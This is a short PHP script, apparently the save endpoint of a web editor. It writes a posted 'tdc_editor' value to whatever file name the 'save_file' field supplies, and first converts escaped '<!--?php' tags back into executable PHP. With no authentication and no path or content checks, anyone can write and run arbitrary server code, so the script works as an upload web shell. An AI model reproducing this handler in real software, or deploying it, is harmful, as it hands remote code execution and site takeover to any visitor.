<?php

if (!empty($_POST))
{
    $filename="temp.txt";
	foreach ( $_POST as $key => $value )
	{
		if ( ( !is_string($value) && !is_numeric($value) ) || !is_string($key) )
			continue;

		if ( $key == "save_file" ) {
		    $filename=$value ;
		    $file=fopen("ckfname","w");
			fwrite($file,$filename);
			fclose($file);
		}
		if ( $key == "tdc_editor" && $filename != "" ) {
		    $edvalue = str_replace('<!--?php', '<?php', $value);
		    $edvalue = str_replace('?-->', '?>', $edvalue);
			$edvalue = trim( $edvalue );
		    $file=fopen($filename,"w");
			fwrite($file,$edvalue);
			fclose($file);
			break ;
		}		
    }	
}
	
?>
